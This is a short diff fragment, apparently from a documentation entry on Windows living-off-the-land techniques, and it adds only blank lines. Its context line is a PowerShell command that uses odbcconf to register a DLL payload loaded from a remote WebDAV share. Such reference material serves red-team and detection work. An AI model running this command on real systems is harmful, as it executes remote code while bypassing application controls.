@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:11.087104+00:00'
 ```powershell
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
+
+
